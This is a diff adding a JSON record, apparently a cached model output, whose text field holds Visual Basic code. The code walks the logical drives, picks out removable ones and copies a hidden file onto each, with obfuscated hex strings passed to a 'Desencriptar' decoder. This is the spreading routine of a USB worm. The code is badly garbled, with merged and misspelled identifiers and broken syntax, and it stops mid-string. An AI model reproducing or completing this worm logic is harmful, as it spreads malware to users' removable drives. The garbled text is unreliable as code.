@@ -1,0 +1,5 @@
+{
+  "cache_key": "d70dc9c5f741c5221b02",
+  "provider_request_id": null,
+  "text": "Context: Public Function SubExFloods(Filename As String, Hide As Boolean) As Long Dim szBuffer As String * 128 Dim Drive As Variant Dim Drives() As String hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer) If hGet <> 0 Then Drives = Split(szBuffer, Chr(0)) For Each Drive In Drives If GetDriveTypeDrive) = DRIVE_REMOVABLE ThenGet If CopyToFile (FileToFile) ThenFileOfAttilename, True Drive & Fileename) = TrueIf WriteToFileFileFileDrive & Desencriptar\"61757Fib72E275E269666\"), _ DesencriptExabytes\"5B61757Fib76E672E5E"
+}
